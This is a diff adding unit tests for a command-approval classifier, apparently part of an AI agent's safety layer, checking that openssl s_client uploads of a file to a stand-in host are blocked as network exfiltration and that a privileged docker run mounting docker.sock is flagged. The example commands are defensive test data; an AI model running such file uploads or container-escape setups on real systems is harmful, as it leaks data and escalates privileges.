@@ -1584,6 +1584,27 @@ class SparkCliTests(unittest.TestCase):
                 self.assertTrue(decision.requires_approval)
                 self.assertEqual(decision.action_class, "network_exfiltration")
 
+    def test_approval_classifier_flags_openssl_s_client_file_uploads(self) -> None:
+        for command in (
+            ["openssl", "s_client", "-connect", "example.test:443", "<", "report.txt"],
+            ["openssl", "s_client", "-quiet", "-connect", "example.test:443", "<report.txt"],
+        ):
+            with self.subTest(command=command):
+                decision = approval_required_for_command(command, CommandContext(non_interactive=True))
+                self.assertTrue(decision.requires_approval)
+                self.assertEqual(decision.action_class, "network_exfiltration")
+                self.assertEqual(decision.approval_mode, "blocked")
+                self.assertEqual(decision.confirmation_phrase, "approve network upload")
+
+    def test_approval_classifier_allows_openssl_s_client_without_file_input(self) -> None:
+        for command in (
+            ["openssl", "s_client", "-connect", "example.test:443"],
+            ["openssl", "version"],
+        ):
+            with self.subTest(command=command):
+                decision = approval_required_for_command(command, CommandContext(non_interactive=True))
+                self.assertFalse(decision.requires_approval)
+
     def test_approval_classifier_flags_docker_privilege_escalation(self) -> None:
         decision = approval_required_for_command(
             ["docker", "run", "--rm", "--privileged", "-v", "/var/run/docker.sock:/var/run/docker.sock", "spark-live"],
